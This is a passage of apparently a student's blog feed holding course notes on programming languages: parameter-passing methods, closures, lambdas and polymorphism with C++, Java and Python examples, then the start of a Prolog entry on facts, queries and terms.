  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">**args</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(args))   <span class="comment"># dict</span></span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> args.items():</span><br><span class="line">        <span class="built_in">print</span>(key, <span class="string">&quot;-&gt;&quot;</span>, value) <span class="comment"># name -&gt; doge</span></span><br><span class="line">                                <span class="comment"># age -&gt; 17</span></span><br><span class="line"></span><br><span class="line">fun(name = <span class="string">&quot;doge&quot;</span>, age = <span class="number">17</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Parameter-Passing-Methods"><a href="#Parameter-Passing-Methods" class="headerlink" title="Parameter Passing Methods"></a>Parameter Passing Methods</h2><h3 id="Passing-Value"><a href="#Passing-Value" class="headerlink" title="Passing Value"></a>Passing Value</h3><ol>
<li><p><font color="3A75EA"><strong>Pass-by-Value</strong></font></p>
<ul>
<li>the value of the argument is used to initialize the corresponding parameter</li>
<li>normally implemented by simply copying  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">3</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">5</span>;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sum</span>(a, b) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><font color="3A75EA"><strong>Advantage</strong></font>: no side-effect</li>
<li><font color="3A75EA"><strong>Disadvantage</strong></font>: require additional storage</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Pass-by-Result</strong></font></p>
<ul>
<li>no value is transmitted to the subprogram, the parameter simply acts as a local variable</li>
<li>i.e., the value is transmitted to the caller’s argument when control return to the caller by coping  <figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="function">subroutine <span class="title">foo</span><span class="params">(result x)</span></span></span><br><span class="line"><span class="function">    x </span>= x * <span class="number">2</span></span><br><span class="line">end subroutine</span><br><span class="line"></span><br><span class="line">main</span><br><span class="line">    variable a = <span class="number">3</span></span><br><span class="line">    call <span class="built_in">foo</span>(a)</span><br><span class="line">    print a  <span class="comment">// prints 6</span></span><br><span class="line">end main</span><br></pre></td></tr></table></figure></li>
<li>Potential problem:<br>  <code>call foo(a, a)</code>: in this case, what should a be?</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Pass-by-Value-Result</strong></font></p>
<ul>
<li>combination of pass-by-value and pass-by-result</li>
<li>i.e., copying the value of argument to the parameter, then do some change on the parameter in the subprogram, then copying the value of parameter to the argument when return<ul>
<li><font color="3A75EA"><strong>Disadvantage</strong></font>: combination of pass-by-value and pass-by-result</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="Passing-Object"><a href="#Passing-Object" class="headerlink" title="Passing Object"></a>Passing Object</h3><ol>
<li><p><font color="3A75EA"><strong>Pass-by-Reference</strong></font></p>
<ul>
<li>pass the reference to the argument variable (can be simulated in pass-by-value of pointers for languages that not support reference)<ul>
<li>copying the address of arguments instead of the whole data structure  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">int</span>&amp; a)</span></span>&#123;</span><br><span class="line">    a = <span class="number">99</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">f</span>(b);</span><br><span class="line">    cout &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><font color="3A75EA"><strong>Advantage</strong></font>: passing is efficient because there is no copying and duplicate storage</li>
<li><font color="3A75EA"><strong>Disadvantage</strong></font>: <ul>
<li>slower <font color="3A75EA">access</font> (indirect access)</li>
<li>potential for the side effect</li>
</ul>
</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Pass-by-Sharing</strong></font></p>
<ul>
<li>copy the reference argument (point to an object) and pass to the parameter</li>
<li><font color="3A75EA"><strong>Note</strong></font>: it is for <strong>object</strong> only (so need to wrapper the primitive data values in we want to use Pass-by-Sharing in those values)</li>
<li>Python &#x2F; Ruby use Pass-by-Sharing<br>  Everything is concidered as an object (all variables are considered as references to some objects)</li>
<li>Java also use pass-by-sharing for object arguments<br>  Consider Pass-by-Sharing is just similar to Pass-by-value (copying), so simply use Pass-by-Value (where the value is a reference)</li>
</ul>
</li>
</ol>
<ul>
<li><font color="F54747"><strong>Pass-by-Renerence vs Pass-by-Sharing</strong></font>  <img src="https://p.ipic.vip/89i5ed.png" width="400px" />

<ul>
<li><p>Implementation of Pass-by-Renerence (similated using pointer) in C++</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">    string name;</span><br><span class="line">    <span class="built_in">Dog</span>(string name): <span class="built_in">name</span>(name) &#123;&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(Dog*&amp; d)</span></span>&#123;  <span class="comment">// &amp; - reference Dog* a pointer to Dog type</span></span><br><span class="line">    d-&gt;name = <span class="string">&quot;corgi&quot;</span>;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Dog</span>(<span class="string">&quot;shiba&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Dog* d = <span class="keyword">new</span> <span class="built_in">Dog</span>(<span class="string">&quot;husky&quot;</span>);</span><br><span class="line">    <span class="built_in">fun</span>(d); <span class="comment">// passing-by-reference</span></span><br><span class="line">    cout &lt;&lt; d-&gt;name &lt;&lt; endl;    <span class="comment">// outputs: shiba</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Implementation of Pass-by-Sharing in Java</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    Dog(String name)&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">(Dog d)</span>&#123;</span><br><span class="line">        d.name = <span class="string">&quot;corgi&quot;</span>;</span><br><span class="line">        d = <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;shiba&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;husky&quot;</span>);</span><br><span class="line">        fun(d); <span class="comment">// passing-by-sharing</span></span><br><span class="line">        System.out.println(d.name); <span class="comment">// outputs: corgi</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>The main different is the new assignment for the parameter in the subprogram:</p>
<ul>
<li><font color="3A75EA"><strong>Pass-by-Reference</strong></font> is <font color="3A75EA">passing a reference to the argument</font></li>
<li><font color="3A75EA"><strong>Pass-by-Sharing</strong></font> is <font color="3A75EA">passing a copied  reference from the argument</font><br>  Therefore, when there is a new assignment to the parameter, the argument is also changed in <font color="3A75EA"><strong>Pass-by-Reference</strong></font> but not <font color="3A75EA"><strong>Pass-by-Sharing</strong></font>  <img src="https://p.ipic.vip/5wvd60.png" width="450px" /></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a>Parameters</h2><h3 id="Multidimensional-Arrays"><a href="#Multidimensional-Arrays" class="headerlink" title="Multidimensional Arrays"></a>Multidimensional Arrays</h3><ul>
<li><p>access an element in a multi-dimensional array, a <font color="F54747">storage mapping function</font> (address calculation) has to be built</p>
<ul>
<li><code>int a[4][2] = &#123;&#123;11,12&#125;, &#123;21,22&#125;, &#123;31,32&#125;, &#123;41,42&#125;&#125;;</code>  <table>
  <tr>
      <th colspan="9" style="text-align: center;">Memory Address (One-dimensional)</th>
  </tr>
  <tr>
      <td style="text-align: center;">11</td>
      <td style="text-align: center;">12</td>
      <td style="text-align: center;">21</td>
      <td style="text-align: center;">22</td>
      <td style="text-align: center;">31</td>
      <td style="text-align: center;">32</td>
      <td style="text-align: center;">41</td>
      <td style="text-align: center;">42</td>
      <td style="text-align: center;">...</td>
  </tr>
  </table>

<ul>
<li>address of <code>a[3][1]</code> &#x3D; (address of <code>a[0][0]</code>) + (3 * 2 + 1) * (<code>sizeof int</code>)</li>
</ul>
</li>
</ul>
</li>
<li><p>C&#x2F;C++ Implementation</p>
<ul>
<li><strong>Porblems</strong>:<ol>
<li><p>C&#x2F;C++ requires programmer to include the declared size of all (but not the first dimension) in the array parameter</p>
<ul>
<li>It is necessary for the programmer to declare the parameter like<br>  <code>void f(int a[2][3][8])</code> or <code>void f(int a[][3][8])</code>(but not the first dimension)</li>
</ul>
</li>
<li><p><code>sizeof</code> array in a function</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">int</span> a[<span class="number">10</span>])</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(a) &lt;&lt; endl;  <span class="comment">// 8</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">10</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">sizeof</span>(a) &lt;&lt; endl;  <span class="comment">// 40: 4 * 10</span></span><br><span class="line">    <span class="built_in">f</span>(a);   <span class="comment">// 8: sizeof the pointer instead of the array</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><strong>Solution</strong>:<ul>
<li>We can use a <font color="F54747"><strong>flexible workaround</strong></font><ul>
<li>pass a pointer to the array and the sizes of the dimensions as other parameters<br>  <code>void f(int* a, int firstDSize, int secondDSize, int thirdDSize)</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Java&#x2F;C#&#x2F;Python Implementation</p>
<ul>
<li>Arrays are objects in those languages, so the multi-dimensional array is <font color="3A75EA">single-dimensioned</font><ul>
<li><code>int a[][] = &#123;&#123;11&#125;, &#123;21,22,23&#125;, &#123;31,32&#125;&#125;;</code>  <table>
  <tr>
      <th colspan="7" style="text-align: center;">Memory Address (One-dimensional)</th>
  </tr>
  <tr>
      <td style="text-align: center;">Array Object</td>
      <td colspan="3" style="text-align: center;">Array Object</td>
      <td colspan="2" style="text-align: center;">Array Object</td>
      <td style="text-align: center;">...</td>
  </tr>
  <tr>
      <td style="text-align: center;">11</td>
      <td style="text-align: center;">21</td>
      <td style="text-align: center;">22</td>
      <td style="text-align: center;">23</td>
      <td style="text-align: center;">31</td>
      <td style="text-align: center;">32</td>
      <td style="text-align: center;">...</td>
  </tr>
  </table></li>
<li>Access the size of array:<ul>
<li><code>l.length</code> in Java</li>
<li><code>len(l)</code> in Python</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Subprograms"><a href="#Subprograms" class="headerlink" title="Subprograms"></a>Subprograms</h3><ul>
<li><p>There are situations in which a subprogram is a parameter of another subprogram</p>
</li>
<li><p>C&#x2F;C++ Implementation</p>
<ul>
<li>functions can be passed as <font color="3A75EA">function pointers</font> <code>(*p)(...)</code>  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a, b, c;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;f() is called, &quot;</span> &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">g</span><span class="params">(<span class="type">void</span> (*p)(<span class="type">int</span>), <span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="built_in">p</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">g</span>(f, <span class="number">3</span>);    <span class="comment">// f() is called, 3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Python Implementation</p>
<ul>
<li>functions in Python are <font color="F54747">first-class citizens</font> and simply objects<br>  so it can be simply passed as parameter like any other Objects  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;f() is called,&quot;</span>, x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;p() is called,&quot;</span>, x + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>(<span class="params">fun, x</span>):</span><br><span class="line">    fun(x)</span><br><span class="line"></span><br><span class="line">g(f, <span class="number">2</span>)     <span class="comment"># f() is called, 2</span></span><br><span class="line">g(p, <span class="number">2</span>)     <span class="comment"># p() is called, 3</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Closures"><a href="#Closures" class="headerlink" title="Closures"></a>Closures</h3><ul>
<li>it is a subprogram and the <a href="https://donaldlamnl.github.io/myBlog/2023/02/25/2023/CSCI3180/2023-2-25-CSCI3180-Scope/">referencing environment</a> where it was defined</li>
<li>the referencing environment is needed if the subprogram can be called from any arbitrary place in the program</li>
</ul>
<ol>
<li><p>A static-scoped language that <strong>does not permit nested subprograms</strong> doesn’t need closures</p>
<ul>
<li>Implementation in C++:   <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> global_var = <span class="number">4</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">1</span>, b = <span class="number">2</span>, c = <span class="number">3</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;f() is called, local = &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, global = &quot;</span> &lt;&lt; global_var &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">g</span><span class="params">(<span class="type">void</span> (*p)())</span></span>&#123;</span><br><span class="line">    <span class="built_in">p</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">f</span>();        <span class="comment">// f() is called, local = 1, global = 4</span></span><br><span class="line">    <span class="built_in">g</span>(f);       <span class="comment">// f() is called, local = 1, global = 4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>the referencing environment in f (<em>called from any arbitrary place in the program</em>) is the local variables (<code>a</code>, <code>b</code>, <code>c</code>) and the global variables which is <font color="F54747">same as directly calling</font>, so the static-scoped language that does not support <font color="3A75EA">nested programming</font> doesn’t need closures</li>
</ul>
</li>
</ul>
</li>
<li><p>Closures are necessary for a subprogram that can access variables in the nesting scopes and it can called from abywhere</p>
<ul>
<li>Implementation in Python:   <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">adder</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">template_adder</span>(<span class="params">y</span>):     <span class="comment"># nested subprogram</span></span><br><span class="line">        <span class="keyword">return</span> x+y</span><br><span class="line">    <span class="keyword">return</span> template_adder</span><br><span class="line">    <span class="comment"># actually returning a closure that has the referencing environment as adder</span></span><br><span class="line"></span><br><span class="line">add_five = adder(<span class="number">5</span>) <span class="comment"># the closures (&lt;function adder.&lt;locals&gt;.template_adder at 0x55dec94ab020&gt;)</span></span><br><span class="line"><span class="built_in">print</span>(add_five(<span class="number">2</span>))  <span class="comment"># 7</span></span><br></pre></td></tr></table></figure>
<ul>
<li>the referencing environment of <code>template_adder</code> has <code>x</code> which is outside the definition of <code>template_adder</code>, but because Python supports closures, so <code>x</code> is also passed through to the <code>template_adder</code></li>
<li>the clousre returned from <code>adder</code> is both the function and the referencing environment</li>
</ul>
</li>
</ul>
</li>
</ol>
<ul>
<li>closures actually <font color="F54747">extended lifetime</font> to some variables, in case, <code>x</code> is extended as the function <code>adder</code> has already ended</li>
</ul>
<h3 id="Lambdas"><a href="#Lambdas" class="headerlink" title="Lambdas"></a>Lambdas</h3><ul>
<li>anonymous functions (which syntax is much more simplier and readable than defining a function) using the keyword <code>lambda</code><ul>
<li>Implementation in Python:  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">adder</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> y: x + y</span><br><span class="line"></span><br><span class="line">add_five = adder(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(add_five(<span class="number">2</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>In case, the function named <code>template_adder</code> is not important as it would be “rename” later<br>  (<code>add_five = adder(5)</code>: the function <code>template_adder</code> is actually renamed to <code>add_five</code>)</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Polymorphic-Subprograms"><a href="#Polymorphic-Subprograms" class="headerlink" title="Polymorphic Subprograms"></a>Polymorphic Subprograms</h2><ul>
<li>Polymorphic subprograms are subprograms that can operate on different types of data</li>
</ul>
<ol>
<li><p><strong>Adhoc Polymorphism</strong></p>
<ul>
<li>Overloaded subprograms provide a particular kind of polymorphism called adhoc polymorphism  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">printType</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;int is the best!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printType</span><span class="params">(<span class="type">float</span> x)</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;float is the best!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printType</span>(<span class="number">1</span>);       <span class="comment">// int is the best!</span></span><br><span class="line">    <span class="built_in">printType</span>(<span class="number">1.0f</span>);    <span class="comment">// float is the best!</span></span><br><span class="line">    <span class="built_in">printType</span>(<span class="literal">true</span>);    <span class="comment">// int is the best!</span></span><br><span class="line">    <span class="built_in">printType</span>(<span class="number">1.0</span>);     <span class="comment">// ERROR</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>Subtype Polymorphism</strong></p>
</li>
</ol>
<ul>
<li>A parameter of type X can take any object of type X or any type derived from X  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Food</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Eating food.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Apple</span> : <span class="keyword">public</span> Food &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">eat</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Eating apple.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Water</span> : <span class="keyword">public</span> Food &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">drink</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;Drinking water.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Food* food = <span class="keyword">new</span> <span class="built_in">Food</span>();</span><br><span class="line">    Food* apple = <span class="keyword">new</span> <span class="built_in">Apple</span>();</span><br><span class="line">    Food* water = <span class="keyword">new</span> <span class="built_in">Water</span>();</span><br><span class="line"></span><br><span class="line">    food-&gt;<span class="built_in">eat</span>();    <span class="comment">// Eating food.</span></span><br><span class="line">    apple-&gt;<span class="built_in">eat</span>();   <span class="comment">// Eating apple.</span></span><br><span class="line">    water-&gt;<span class="built_in">eat</span>();   <span class="comment">// Eating food. (since the Water class doesn&#x27;t override the eat() method)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<!-- 
<font color="3A75EA">Blue</font>
<font color="F54747">Red</font>
-->
]]></content>
      <categories>
        <category>CSCI3180</category>
      </categories>
      <tags>
        <tag>CSCI3180</tag>
      </tags>
  </entry>
  <entry>
    <title>CSCI3180 - Logic Programming</title>
    <url>/myBlog/2023/04/28/2023/CSCI3180/2023-4-28-CSCI3180-Logic-Programming/</url>
    <content><![CDATA[<h2 id="Declarative-Programming"><a href="#Declarative-Programming" class="headerlink" title="Declarative Programming"></a>Declarative Programming</h2><ol>
<li><p>Imperative (Conventional) Languages Properties</p>
<ul>
<li><font color="3A75EA">State-oriented</font>: each statement execution changes the abstract machine state</li>
<li><font color="3A75EA">Destructive assignment</font>: update the value</li>
<li><font color="3A75EA">Side effects</font></li>
<li>Difficult to read, write, and verify programs</li>
</ul>
</li>
<li><p>Declarative languages</p>
<ul>
<li>Higher program understandability and verifiability</li>
<li>Referential transparency: no side effect</li>
</ul>
</li>
</ol>
<h2 id="Prolog"><a href="#Prolog" class="headerlink" title="Prolog"></a>Prolog</h2><ul>
<li><p>Divided into two stages:</p>
<ol>
<li>Building a program (asserting what is true)</li>
<li>Running a program (asking for consequences of what has been asserted)</li>
</ol>
</li>
<li><p>A Prolog program is a collection of <font color="3A75EA">assertions</font></p>
<ol>
<li><font color="F54747">Facts</font></li>
<li><font color="F54747">Rules</font><br>  They are used to express relationships amongst some objects</li>
</ol>
</li>
</ul>
<h3 id="Facts"><a href="#Facts" class="headerlink" title="Facts"></a>Facts</h3><ul>
<li><p>a statement that <font color="3A75EA">asserts a relationship between objects</font></p>
</li>
<li><p>Facts can be of <font color="3A75EA">various arities</font></p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">father(edwyn, caroline).    <span class="comment">/* &quot;Edwyn is the father of Caroline.&quot; */</span></span><br><span class="line">give(tom, apple, teacher).  <span class="comment">/* &quot;Tom gives an apple to the teacher.&quot; */</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Unary facts denote <font color="3A75EA">properties</font></p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">red(apple).     <span class="comment">/* &quot;Apple is red.&quot; */</span></span><br><span class="line">number(three).  <span class="comment">/* &quot;Three is a number.&quot; */</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h3><ul>
<li><p>Prolog is executed by posting a question (<font color="F54747">query</font>), which makes a request for information based on the facts and rules defined in a program.</p>
<ul>
<li>provided facts  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">father(george, randy).</span><br><span class="line">mother(kari, peter).</span><br><span class="line">father(randy, kari).</span><br><span class="line">mother(kari, mary).</span><br></pre></td></tr></table></figure></li>
<li>query  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">?- father(george, randy).  <span class="comment">/* yes */</span></span><br><span class="line">?- mother(kari, june).  <span class="comment">/* no */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Is there an X such that X is the father of randy ? */</span></span><br><span class="line">?- father(<span class="symbol">X</span>, randy).</span><br><span class="line"><span class="comment">/* X = george */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Is there an X such that Kari is the mother of X ? */</span></span><br><span class="line">?- mother(kari, <span class="symbol">X</span>).</span><br><span class="line"><span class="comment">/* X = mary;</span></span><br><span class="line"><span class="comment">   X = peter */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Are there X and Y such that X is the father of Y ? */</span></span><br><span class="line">?- father(<span class="symbol">X</span>, <span class="symbol">Y</span>).</span><br><span class="line"><span class="comment">/* X = randy        X = george</span></span><br><span class="line"><span class="comment">   Y = kari;        Y = randy */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Is there an X such that X is the mother of him/herself ? */</span></span><br><span class="line">?- mother(<span class="symbol">X</span>, <span class="symbol">X</span>).</span><br><span class="line"><span class="comment">/* no */</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>In general, query can carry many subqueries:<br>  $$\text{?-} \space G_1, \cdots , G_m \quad \forall m \geq 0 \quad \text{where G is an query}$$</p>
<ul>
<li>use <code>,</code> to conjunct the subqueries  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Are there X &amp; Z such that X is the father of Z and Z is the father of Kari? */</span></span><br><span class="line">?- father(<span class="symbol">X</span>, <span class="symbol">Z</span>), father(<span class="symbol">Z</span>, kari).</span><br><span class="line"><span class="comment">/* X = george</span></span><br><span class="line"><span class="comment">   Z = randy */</span></span><br></pre></td></tr></table></figure></li>
<li>When $m&#x3D;0$, it is an empty query</li>
</ul>
</li>
</ul>
<h3 id="Terms"><a href="#Terms" class="headerlink" title="Terms"></a>Terms</h3><ul>
<li>Prolog programs are constructed from terms which can be constants, variables or structures</li>
</ul>
<ol>
<li><p><strong>Constants</strong></p>
<ul>
<li>represent a specific object</li>
<li>must start with a lower-case letter <code>karl</code></li>
<li>they can be number (but we just focus on the logical part so we seldom use number)</li>
</ul>
</li>
<li><p><strong>Variables</strong></p>
<ul>
<li>must start with a upper-case letter <code>X, Y, Z</code></li>
</ul>
</li>
<li><p><strong>Structures</strong></p>
<ul>
<li>They consist of a functor and a number of arguments<ul>
<li><code>bonks(big_doge, small_doge)</code></li>
<li><font color="3A75EA">functor</font>: <code>bonks</code></li>
<li><font color="3A75EA">arguments</font>: <code>big_doge</code>, <code>small_doge</code></li>
</ul>
</li>
<li>Advanced usage:<ul>
<li>Suppose we want to represent a location on a map, we can use a structure with two components a latitude (<code>p</code>) and a longitude (<code>q</code>) <code>loc(p, q)</code></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Functor</strong></p>
<ul>
<li>glue some objects into a composite object</li>
<li>A functor may have only one argument (for labeling an argument)<ul>
<li><code>south(32)</code></li>
<li><code>loc(north(45), east(72))</code></li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h3><ul>
<li><p>Some concepts are based on the others</p>
<ul>
<li><p>e.g., To find a parent, we have to ask two questions to obtain a single piece of information</p>
  <figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">?- father(<span class="symbol">X</span>,kari).</span><br><span class="line">?- mother(<span class="symbol">X</span>,kari).</span><br></pre></td></tr></table></figure>
<ul>
<li>either of the above queries succeeds, a parent of Kari is found</li>
</ul>
</li>
<li><p>We can translate the “parent” concept into the “father” and “mother” concepts using Rules</p>
</li>
</ul>
</li>
<li><p>Form of Rules:<br>  $$H \space \text{:-} \space B_1, \cdots, B_n \quad \forall n \geq 0 \quad \text{where H is the head and B is the body of the rule}$$</p>
<ul>
